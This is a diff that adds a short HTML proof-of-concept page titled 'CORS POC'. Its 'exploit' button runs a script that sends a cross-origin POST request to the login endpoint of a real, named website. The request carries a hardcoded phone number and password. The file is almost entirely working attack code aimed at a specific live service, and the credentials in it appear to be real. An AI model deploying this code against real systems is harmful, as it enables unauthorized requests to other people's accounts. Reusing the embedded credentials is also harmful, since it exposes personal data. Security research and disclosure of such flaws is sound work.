@@ -1,0 +1,23 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>poc</title>
+</head>
+<body>
+<h2>CORS POC</h2>
+<button onclick="go()">exploit</button>
+
+</body>
+
+<script>
+    function go(){
+
+
+        var xmlhttp = new XMLHttpRequest();
+        xmlhttp.open("POST", "https://www.namava.ir/api/v1.0/accounts/login/by-phone" , true);
+        xmlhttp.setRequestHeader("Content-Type", "application/json");
+        xmlhttp.send(JSON.stringify({"UserName":"+989044387585","Password":"Ramisss"}));
+
+    }
+</script>
+</html>
